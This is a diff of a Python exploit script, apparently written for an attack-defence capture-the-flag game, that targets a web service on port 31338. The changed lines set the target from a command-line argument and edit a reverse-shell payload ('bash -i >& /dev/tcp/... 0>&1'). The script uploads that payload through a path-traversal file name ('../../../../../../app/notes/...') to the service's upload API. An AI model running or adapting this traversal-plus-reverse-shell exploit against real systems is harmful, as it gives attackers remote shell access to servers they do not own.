@@ -2,10 +2,11 @@ import requests
 import random
 from checklib import *
 from bs4 import BeautifulSoup
+import sys
 
-IP = "10.99.99.12"
+IP = sys.argv[1]
 BASE_APP = f"http://{IP}:31338"
-JURY_IP = "10.99.201.6"
+JURY_IP = "10.10.10.10"
 
 proxies = {
     'http':'http://127.0.0.1:8080',
@@ -38,7 +39,7 @@ def attack(sess: requests.Session):
     soup = BeautifulSoup(resp.text, 'html.parser')
     uid = soup.find_all('p', class_="mb-0")[1].text
     # sess.proxies.update(proxies)
-    pld = gen_pld("bash -i >& /dev/tcp/10.99.99.12/9323 0>&1")
+    pld = gen_pld("bash -i >& /dev/tcp/10.80.6.2/9323 0>&1")
     sess.post(f"{BASE_APP}/api/files/upload", files={
         'file':(f"../../../../../../app/notes/{uid}/{uid}",pld)
     })
